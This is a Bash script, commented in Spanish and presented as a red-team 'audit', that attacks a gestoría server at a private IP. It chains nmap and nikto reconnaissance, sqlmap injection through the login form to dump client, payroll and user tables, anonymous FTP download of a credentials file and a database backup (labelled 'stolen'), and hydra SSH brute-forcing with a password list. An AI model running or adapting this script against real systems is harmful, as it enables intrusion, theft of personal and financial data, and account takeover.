#!/bin/bash
# ============================================================================
#  Auditoría automatizada de Apex Gestoría desde jamsec-redteam.
#  Ejecuta pruebas de varios ámbitos y guarda evidencias en ~/auditoria/.
#  Objetivo perimetral: 172.20.17.230  (puertos publicados 80, 2222, 21)
# ============================================================================
T=172.20.17.230
OUT=/home/jamsec/auditoria
mkdir -p "$OUT"
cd "$OUT"
ts() { date "+%Y-%m-%d %H:%M:%S"; }

echo "############ AUDITORÍA APEX GESTORÍA — $(ts) ############"

echo; echo "==================== FASE 1: RECONOCIMIENTO (nmap) ===================="
nmap -Pn -sV -p 1-10000 -oN "$OUT/01-nmap-servicios.txt" "$T" 2>&1 | tail -25

echo; echo "==================== FASE 2: AUDITORÍA WEB ===================="
echo "--- whatweb ---"
whatweb "http://$T/" 2>&1 | tee "$OUT/02-whatweb.txt"
echo "--- nikto (resumen) ---"
nikto -h "http://$T/" -maxtime 60 2>&1 | tee "$OUT/02-nikto.txt" | tail -15
echo "--- SQL injection (sqlmap: enumerar y volcar BBDD a través del login) ---"
sqlmap -u "http://$T/login.php" --data="usuario=admin&password=x" \
  --batch --level=3 --risk=2 --dbs 2>&1 | tee "$OUT/03-sqlmap-dbs.txt" | tail -20
echo "--- sqlmap: volcar tabla clientes y nominas de apexgestoria ---"
sqlmap -u "http://$T/login.php" --data="usuario=admin&password=x" \
  --batch -D apexgestoria -T clientes,nominas,usuarios --dump 2>&1 | tee "$OUT/04-sqlmap-dump.txt" | tail -30

echo; echo "==================== FASE 3: FTP ANÓNIMO ===================="
{
  echo "open $T 21"
  echo "user anonymous anonymous"
  echo "ls"
  echo "get credencials.txt $OUT/ftp-credencials.txt"
  echo "get backup_apexgestoria.sql $OUT/ftp-backup.sql"
  echo "bye"
} | ftp -n -v 2>&1 | tee "$OUT/05-ftp.txt" | tail -20
echo "--- contenido robado por FTP ---"
cat "$OUT/ftp-credencials.txt" 2>/dev/null

echo; echo "==================== FASE 4: FUERZA BRUTA SSH (puerto 2222) ===================="
printf '123456\nadmin\npassword\nsoporte\nsoporte123\nroot\ntoor\napex\n' > "$OUT/wordlist.txt"
hydra -l soporte -P "$OUT/wordlist.txt" -s 2222 -t 4 -f "ssh://$T" 2>&1 | tee "$OUT/06-hydra-ssh.txt" | tail -12

echo; echo "############ AUDITORÍA FINALIZADA — $(ts) ############"
echo "Evidencias en $OUT"
ls -la "$OUT"
